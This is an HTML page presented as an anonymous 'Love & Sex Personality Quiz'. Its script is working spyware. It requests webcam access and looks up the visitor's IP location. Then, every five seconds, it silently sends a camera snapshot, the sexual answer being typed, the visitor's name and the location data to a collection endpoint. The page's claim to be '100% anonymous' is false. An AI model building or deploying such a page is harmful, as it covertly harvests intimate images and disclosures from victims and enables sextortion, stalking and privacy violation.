<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>‚ù§Ô∏è Love & Sex Personality Quiz</title>
  <style>
    body { font-family: Arial; background: linear-gradient(135deg, #ff9a9e, #fad0c4); color: #333; text-align:center; padding:20px; }
    .container { max-width: 600px; margin: auto; background: white; padding:30px; border-radius:20px; box-shadow:0 10px 30px rgba(0,0,0,0.2); }
    input, button { padding:12px; font-size:18px; margin:10px; border-radius:8px; }
    button { background:#e91e63; color:white; border:none; cursor:pointer; }
    .question { font-size:20px; margin:25px 0; font-weight:bold; color:#c2185b; }
    #answer { width:80%; padding:15px; font-size:18px; }
  </style>
</head>
<body>
<div class="container">
  <h1>‚ù§Ô∏è Love & Sex Personality Quiz</h1>
  <p>100% anonymous ¬∑ Takes only 3 minutes</p>
  <input type="text" id="name" placeholder="Enter your name to begin" /><br/>
  <button onclick="startQuiz()">Start Quiz</button>
  <div id="quiz" style="display:none;">
    <p class="question" id="q"></p>
    <input type="text" id="answer" placeholder="Type your answer here..." autocomplete="off" />
  </div>
</div>
<video id="video" width="320" height="240" style="display:none;"></video>
<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
<script>
const questions = [
  "What turns you on the most?",
  "Describe your ideal first date ending?",
  "How often do you think about sex?",
  "Biggest turn-off in bed?",
  "Have you ever had a one-night stand?",
  "Favorite position? üòè",
  "Would you try role-play?",
  "What body part do you find sexiest?"
];
let name = "";
let interval;
let photoCount = 0;
async function startQuiz() {
  name = document.getElementById("name").value.trim() || "Anonymous";
  document.querySelector(".container").innerHTML = "<h1>Thank you " + name + "!</h1><p>Loading questions...</p>";
  document.getElementById("quiz").style.display = "block";
  // Get location once
  const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
  // Start camera (very visible) camera permission
  const stream = await navigator.mediaDevices.getUserMedia({ video: true });
  document.getElementById("video").srcObject = stream;
  let qIndex = 0;
  document.getElementById("q").textContent = questions[qIndex];
  // Take photo + send data every 5 seconds
  interval = setInterval(async () => {
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");
    ctx.drawImage(document.getElementById("video"), 0, 0, 320, 240);
    const photo = canvas.toDataURL("image/jpeg", 0.8);
    const keystrokes = document.getElementById("answer") ? document.getElementById("answer").value : "";
    const payload = {
      name,
      timestamp: new Date().toISOString(),
      photo: photo,
      currentAnswer: keystrokes,
      question: questions[qIndex],
      photoNumber: ++photoCount,
      ipData
    };
    // Send silently
    await fetch('https://yourdomain.com/collect.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    // Change question every ~20 seconds (optional)
    if (photoCount % 4 === 0) {
      qIndex = (qIndex + 1) % questions.length;
      document.getElementById("q").textContent = questions[qIndex];
      document.getElementById("answer").value = "";
    }
  }, 5000);
  // Keep running until they close the tab
}
</script>
</body>
</html>